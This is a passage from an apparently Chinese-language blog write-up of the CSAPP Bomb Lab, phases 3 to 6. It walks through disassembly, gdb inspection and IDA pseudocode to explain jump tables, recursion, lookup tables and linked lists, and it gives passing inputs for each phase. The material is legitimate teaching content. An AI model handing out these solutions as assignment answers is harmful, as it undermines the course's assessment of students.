400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>stack frame大概长这样：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04</span><br><span class="line">0x08</span><br><span class="line">0x0c rcx [1]</span><br><span class="line">0x10 rdx [0]</span><br><span class="line">0x14</span><br><span class="line">0x18 rsp</span><br></pre></td></tr></table></figure><br>发现了第一个奇妙地址0x4025cf，我们也用gdb看看：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase3_disass.png">
<p>害……</p>
<p>不过这里有另一个奇妙地址，其实这句话就是switch汇编实现的核心：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure>
<p>穿插复习下括号里两个数字和三个数字的表示法：</p>
<ul>
<li>(a, b) = a + b</li>
<li>(a, b, c) = a + b * c</li>
</ul>
<p>这种括号的表示方法不只在lea指令里面能用，在其他指令里也能见到。</p>
<p>再查一查0x402470这个地址的值，还有后面几个地址的值：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase3_switch.png">
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) p&#x2F;x *0x402470</span><br><span class="line">$9 &#x3D; 0x400f7c</span><br><span class="line">(gdb) p&#x2F;x *0x402478</span><br><span class="line">$10 &#x3D; 0x400fb9</span><br><span class="line">(gdb) p&#x2F;x *0x402480</span><br><span class="line">$11 &#x3D; 0x400f83</span><br><span class="line">(gdb) p&#x2F;x *0x402488</span><br><span class="line">$12 &#x3D; 0x400f8a</span><br><span class="line">(gdb) p&#x2F;x *0x402490</span><br><span class="line">$13 &#x3D; 0x400f91</span><br><span class="line">(gdb) p&#x2F;x *0x402498</span><br><span class="line">$14 &#x3D; 0x400f98</span><br><span class="line">(gdb) p&#x2F;x *0x4024a0</span><br><span class="line">$15 &#x3D; 0x400f9f</span><br><span class="line">(gdb) p&#x2F;x *0x4024a8</span><br><span class="line">$16 &#x3D; 0x400fa6</span><br><span class="line">(gdb) p&#x2F;x *0x4024b0</span><br><span class="line">$17 &#x3D; 0x7564616d</span><br></pre></td></tr></table></figure>
<p>可以发现，从0x402470开始储存的是一个指针数组，因为是64位，所以地址自然是8个字节8个字节间隔的。</p>
<p>并且，这个数组里的指针指向的值，都是<code>phase_3</code>函数的mov指令，即对应了switch语句中的不同分支。</p>
<blockquote>
<p>说句题外话，之所以switch中每个case的最后一般都得加一个<code>break</code>，就是因为在底层就是这样实现的。如果不加<code>break</code>，在每一句执行后就不会<code>jmp</code>出这个switch的判断，在这里就可能%eax被多次赋值。所以该加<code>break</code>还是得加的哦！</p>
</blockquote>
<p>一一对应后，可以梳理出能够通过的8个输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: 0xcf</span><br><span class="line">1: 0x137</span><br><span class="line">2: 0x2c3</span><br><span class="line">3: 0x100</span><br><span class="line">4: 0x185</span><br><span class="line">5: 0xce</span><br><span class="line">6: 0x2aa</span><br><span class="line">7: 0x147</span><br></pre></td></tr></table></figure>
<p>任选其一，就能通过第三关。</p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h2><h3 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase4(IDA).png">
<p>这个部分我们需要保证第一个读入的整数<code>v3</code>小于等于14的同时，<code>func4(v3, 0, 14)</code>也等于0，第二个读入的整数<code>v4</code>也要等于0。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/func4(IDA).png">
<p>而要使这个函数的返回值为0，只需要让<code>a1 = v3 = (14 - 0) / 2 + 0 = 7</code>。</p>
<h3 id="汇编-3"><a href="#汇编-3" class="headerlink" title="汇编"></a>汇编</h3><p>然而汇编并不像IDA反汇编出来的这样清晰，这一关一眼看上去可能眼花，认真看就好了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>栈布局是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04</span><br><span class="line">0x08</span><br><span class="line">0x0c rcx [1]</span><br><span class="line">0x10 rdx [0]</span><br><span class="line">0x14</span><br><span class="line">0x18 rsp</span><br></pre></td></tr></table></figure>
<p>在这里需要满足的有：</p>
<ul>
<li><code>0xe &gt;= *(rsp + 0x8)</code></li>
<li><code>0x0 == *(rsp + 0xc)</code></li>
<li><code>func4(*(rsp + 0x8), 0, 0xe) == 0</code></li>
</ul>
<p>我们进入<code>func4</code>看看汇编：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>没有什么栈的布局，就是些寄存器之间的计算，我们一个一个模拟一下：</p>
<p>（初始化：rdi = ?, rsi = 0, rdx = 0xe）</p>
<ol>
<li>eax = edx,  eax = 0xe</li>
<li>eax -= esi, eax = 0xe</li>
<li>ecx = eax,  ecx = 0xe</li>
<li>ecx &gt;&gt;= 0x1f, ecx &gt;&gt;= 31, ecx = 0（注意是逻辑右移）</li>
<li>eax += ecx, eax = 0xe</li>
<li>eax &gt;&gt;= 1, eax = 0x7（注意是算术右移，且只有一个参数时默认右移1位）</li>
<li>ecx = rax + rsi * 1 = 0x7 + 0 = 0x7</li>
</ol>
<p>然后我们分析下后面跳转的流程：</p>
<ul>
<li>如果%edi &lt;= %ecx，就会跳转到0x400ff2去。</li>
<li>跳转完再来一个cmp，如果%edi &gt;= %ecx，就可以调到0x401007结束函数了。</li>
</ul>
<p>所以只需要%ecx和%edi一样大就可以了，所以rdi直接等于7就可以了。</p>
<p>所以我们直接输入7跟0就可以了。</p>
<p>所以最后复习下这些奇妙的汇编指令，以免我又忘了：</p>
<ul>
<li><code>imul src, dest</code> 乘法</li>
<li><code>sal  src, dest</code> 算术左移</li>
<li><code>sar  src, dest</code> 算术右移</li>
<li><code>shl  src, dest</code> 逻辑左移</li>
<li><code>shr  src, dest</code> 逻辑右移</li>
</ul>
<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase 5"></a>phase 5</h2><h3 id="汇编-4"><a href="#汇编-4" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>这个函数的stack frame是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phase 5</span><br><span class="line">0x00 (rsp)</span><br><span class="line">0x08 canary</span><br><span class="line">0x10 rdi</span><br><span class="line">0x18</span><br><span class="line">0x20 rsp</span><br></pre></td></tr></table></figure>
<p>同样有奇妙地址，我们查一查：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase5_str.png">
<p>这个字符串打印出来之所以这样，是因为它最后一位不是<code>\x00</code>，所以就连续着把紧连着的下一个字符串也输出出来了。</p>
<p>最开始在call出<code>string_length</code>之前的这部分是用来初始化canary的。不用管。</p>
<p>字符串长度必须为6，才能跳转，不然会踩雷。</p>
<p>接下来从0x40108b开始，就是一个6次的循环，rax充当循环的counter，很容易看出来。</p>
<p>如果我们过完这个循环，最终要满足的是这个条件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br></pre></td></tr></table></figure><br>所以我们要做的，就是在跑完上面这次循环之后，让<code>rsp + 0x10</code>开始的字符串跟<code>flyers</code>一毛一样。</p>
<p>这段代码粘下来集中看一看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>开始模拟：</p>
<p>（初始化rbx指向的是最开始的rdi，也就是字符串的开始）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ecx &#x3D; str[i]</span><br><span class="line">*rsp &#x3D; cl (lower 4 digits of str[i])</span><br><span class="line">rdx &#x3D; *rsp &#x3D; cl (lower 4 digits of str[i])</span><br><span class="line">edx &amp;&#x3D; 0xf</span><br><span class="line">edx &#x3D; array3449[cl]</span><br><span class="line">*(rsp + rax + 0x10) &#x3D; dl (lower 4 digits of array3449[cl])</span><br></pre></td></tr></table></figure>
<p>最后的这个<code>(rsp + rax + 0x10)</code>看上去不认识，但是参照下上面的栈结构，其实表示的就是字符串的第i位。</p>
<p>所以我们只需要去注意输入的6个字符中，每个字符的低4位在<code>array3449</code>中索引出来的值，这些值就会一个一个的，填到以<code>rsp + 0x10</code>为开始的字符串中。</p>
<p>手动数一数下标，就可以发现，要对应弄出<code>flyers</code>，我们依次需要下标是<code>9 15 14 5 6 7</code>。</p>
<p>所以我们只需要翻翻ASCII表，找到低4位是这些的字符，拼到一起就可以了。</p>
<p>我最终的答案是<code>ionefg</code>。答案不唯一。</p>
<h3 id="IDA-4"><a href="#IDA-4" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase5(IDA).png">
<p>主要是这句代码太具有迷惑性：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3[i] = array_3449[*(_BYTE *)(a1 + i) &amp; <span class="number">0xF</span>];</span><br></pre></td></tr></table></figure>
<p>正确的解读是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3[i] = array_3449[a1[i] &amp; <span class="number">0xF</span>];</span><br></pre></td></tr></table></figure>
<p>在C里面，一个char所占据的大小恰好就是一个byte，所以<code>_BYTE</code>可以直接看成<code>char</code>。</p>
<p>这里我之所以迷糊，是因为IDA Pro反汇编说<code>a1</code>的类型是<code>int64</code>，然而事实上<code>a1</code>就是个字符串。</p>
<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase 6"></a>phase 6</h2><p>最后一关，太复杂了！那我们就不分析汇编，直接上手看IDA Pro弄出来的代码。</p>
<p>其实弄出来的代码也不好看懂，一不小心也很容易晕！这里重新做一下记录。</p>
<h3 id="IDA-5"><a href="#IDA-5" class="headerlink" title="IDA"></a>IDA</h3><p>反汇编出来的代码长这样，非常长，变量非常多。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_6</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v15[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+18h] [rbp-60h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+28h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+50h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v1 = v15;</span><br><span class="line">  read_six_numbers(a1, v15);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*v1 - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      explode_bomb(a1, v15);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v1 == v15[v3] )</span><br><span class="line">        explode_bomb(a1, v15);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt;= <span class="number">5</span> );</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)v15;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v4 = <span class="number">7</span> - *(_DWORD *)v4;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != &amp;v16 );</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v15[v5 / <span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">1</span>;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (_QWORD *)v6[<span class="number">1</span>];</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != v8 );</span><br><span class="line">    &#125;</span><br><span class="line">    *(__int64 *)((<span class="keyword">char</span> *)&amp;v17 + <span class="number">2</span> * v5) = (__int64)v6;</span><br><span class="line">    v5 += <span class="number">4L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != <span class="number">24</span> );</span><br><span class="line">  v9 = v17;</span><br><span class="line">  v10 = &amp;v18;</span><br><span class="line">  <span class="keyword">for</span> ( i = v17; ; i = v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = *(_QWORD *)v10;</span><br><span class="line">    *(_QWORD *)(i + <span class="number">8</span>) = *(_QWORD *)v10;</span><br><span class="line">    v10 += <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == &amp;v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(v12 + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(v9 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v9 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)result )</span><br><span class="line">      explode_bomb(a1, &amp;v19);</span><br><span class="line">    v9 = *(_QWORD *)(v9 + <span class="number">8</span>);</span><br><span class="line">    --v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v13 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们画一画这个函数的栈：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00 rbp</span><br><span class="line">0x08</span><br><span class="line">0x10</span><br><span class="line">0x18</span><br><span class="line">0x20</span><br><span class="line">0x28 char v19[0x28] 0ll</span><br><span class="line">0x30               &amp;node[v15[5]]</span><br><span class="line">0x38               &amp;node[v15[4]]</span><br><span class="line">0x40               &amp;node[v15[3]]</span><br><span class="line">0x48               &amp;node[v15[2]]</span><br><span class="line">0x50 char v18      &amp;node[v15[1]]  &lt;- v10</span><br><span class="line">0x58 long long v17 &amp;node[v15[0]]  v9</span><br><span class="line">0x60 char v16</span><br><span class="line">0x64 v15[5]</span><br><span class="line">0x68 v15[4]</span><br><span class="line">0x6c v15[3]</span><br><span class="line">0x70 v15[2]</span><br><span class="line">0x74 v15[1]</span><br><span class="line">0x78 v15[0]</span><br></pre></td></tr></table></figure>
<p>这个栈的图片非常非常重要，首先先保证不会乱，因为后面还有跳出栈外的过程。</p>
<p>还有，在分析的过程中，时刻注意每一个变量到底是值，还是指针！千万不能错！</p>
<p>一步一步分析，不要急，一定要慢慢来：</p>
<p>最开始，从<code>v15</code>开始，读入6个<code>int</code>类型的整数，存在栈上。（<code>v15</code>是个指针）</p>
<p>第一个是嵌套循环，<code>v1</code>是当前遍历到的元素的指针，<code>v2</code>表示第几个元素（从1开始数），<code>v3</code>是循环变量。</p>
<p>每次遍历<code>v1</code>，都必须保证<code>1 &lt;= *v1 &lt;= 6</code>，关于强转unsigned int的知识点，在最后有总结。然后内层循环表示后面的元素都得跟前面的不一样，意思就是这6个数各不相同。</p>
<p>第二个是单个do-while循环。它做的就是把这6个数都运算一遍，把<code>x</code>变成了<code>7-x</code>，更改了这6个数。</p>
<p>第三个开始烧脑了！<code>v8</code>是循环中被遍历到的值，根据<code>v8</code>的数值大小，分别执行若干次从<code>&amp;node1</code>开始的<code>v8 - 1</code>次地址跳转，最终把栈上原来数组的值重新写为跳转到最后的地址。</p>
<p>这里注意一下，<code>v6 = (_QWORD *)v6[1];</code>这句代码是伏笔！（为什么这个值可以强转为地址呢？）</p>
<p>我们点进<code>node1</code>，发现在data段，后面刚好延伸到<code>node6</code>结束，这是什么意思？</p>
<p>不懂，我们看到下一个代码部分：</p>
<p>一个for循环，从<code>v17</code>即<code>rbp - 0x58</code>开始，每次循环结束会跳转到<code>v10</code>的值。之所以可以直接迭代为<code>v10</code>的值，是因为这个数组在第三次操作的时候已经变成了指针数组了！</p>
<p>接下来又是一句意味深长的代码：<code>*(_QWORD *)(i + 8) = *(_QWORD *)v10;</code></p>
<p>我们在IDA开始乱了，用gdb看一看有没有线索，毕竟还没有查过那段<code>&amp;node1</code>的奇妙地址。结果非常的意外：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase6_node.png">
<p>不知为什么，每一个node元素，他的第三个数字，恰好跟下一个node的地址一模一样！</p>
<p>其实突破点就出来了：</p>
<p><strong>每一个node是一个struct类型！</strong></p>
<p><strong>node里面的第三个数字，代表着下一个元素的地址！</strong></p>
<p><strong>这就是链表的汇编！</strong></p>
<p>其他的数字是啥意思呢？第一个数字对应节点的值，第二个数字是id，第三个数字是地址，然后怎么有空出来的0？</p>
<p>不是空出来的0，而是因为地址就是64位的！</p>
<p>在这里，结构体内的元素顺序不同，所占用的空间也会不同，这个在CSAPP中有提到过内存对齐的概念！</p>
<p>那为什么上面的那个伏笔，对应的下标是1呢？</p>
<p>因为<code>v6</code>就是一个<code>QWORD</code>类型，而node里面的数字都是int，只有32位呀！</p>
<p>接下来就非常简单了，最后一个循环所代表的，就是确保最终的数值是降序排列的。</p>
